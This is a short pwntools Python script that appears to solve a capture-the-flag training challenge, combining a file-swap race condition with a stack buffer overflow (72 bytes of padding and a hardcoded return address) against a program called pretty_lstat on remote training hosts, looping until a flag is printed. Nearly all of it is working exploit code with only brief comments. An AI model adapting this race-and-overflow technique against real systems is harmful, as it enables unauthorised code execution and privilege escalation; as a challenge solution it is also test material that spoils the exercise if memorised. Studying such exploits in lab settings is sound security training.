from pwn import *
from time import sleep

def get_token(c):
  c.recvuntil(b"token: ")
  return c.recvline().strip() # strip to remove the \n 

def main():
  # Open the first connection to get the token
  c_token = remote("pretty-lstat.training.offensivedefensive.it", 8080, ssl=True)
  token = get_token(c_token)
  c_token.close()
  print(token)

  # Open first terminal
  c1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
  c1.recvuntil(b"Token: ")
  c1.sendline(token)
  print(c1.recvline())

  # Open second terminal
  c2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
  c2.recvuntil(b"Token: ")
  c2.sendline(token)
  print(c2.recvline())

  
  # Craft the command lines sent to the first terminal
  hello = "/home/user/hello.txt "*18 #I pass other arguments to the program so that It will slow down
  payload1 = f"""
    while true; do /home/user/pretty_lstat /home/user/data.txt {hello}; done;
  """
  payload1 = payload1.replace("\n", " ").encode('ascii')  
  
  # Craft the command lines sent to the second terminal
  bof = cyclic(72).decode()
  payload2 = rf"""
    cd;
    echo "hello world" > hello.txt;
    touch data.txt;
    echo -ne "{bof}\x96\x12\x40\x00\x00\x00\x00\x00" > exploit.txt;
    while true; do cp hello.txt data.txt; cp exploit.txt data.txt; done;
  """
  #xxd exploit.txt

  payload2 = payload2.replace("\n", " ").encode('ascii')
  c2.sendline(payload2)
  c1.sendline(payload1)
  c1.recvline()

  while (1):
    try:
      out = c1.recv()
      print('.', flush=True, end='')
      if b'Flag:' in out:
        print(out)
        exit()
    except EOFError:
      main()

if __name__ == "__main__":
  main()
